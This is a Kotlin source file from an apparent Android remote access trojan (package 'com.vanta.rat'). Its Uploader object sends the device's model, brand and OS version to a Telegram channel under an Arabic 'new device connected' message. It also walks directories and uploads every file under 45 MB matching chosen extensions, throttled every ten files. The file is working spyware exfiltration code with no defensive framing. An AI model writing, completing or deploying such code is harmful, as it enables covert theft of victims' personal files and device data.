package com.vanta.rat

import java.io.File
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object Uploader {

    suspend fun sendDeviceInfo() = withContext(Dispatchers.IO) {
        val info = buildString {
            appendLine("📱 جهاز جديد متصل")
            appendLine("Model: ${android.os.Build.MODEL}")
            appendLine("Brand: ${android.os.Build.BRAND}")
            appendLine("Android: ${android.os.Build.VERSION.RELEASE}")
            appendLine("SDK: ${android.os.Build.VERSION.SDK_INT}")
        }
        Telegram.sendMessage(info)
    }

    suspend fun sendDirectory(dir: File, extensions: List<String>, limitMb: Long = 45) = withContext(Dispatchers.IO) {
        if (!dir.exists()) return@withContext
        var count = 0
        dir.walkTopDown().forEach { f ->
            if (f.isFile && f.length() in 1..(limitMb * 1024 * 1024)) {
                val ext = f.extension.lowercase()
                if (extensions.isEmpty() || extensions.contains(ext)) {
                    Telegram.sendFile(f, "📄 ${f.absolutePath}")
                    count++
                    if (count % 10 == 0) Thread.sleep(500)
                }
            }
        }
    }
}
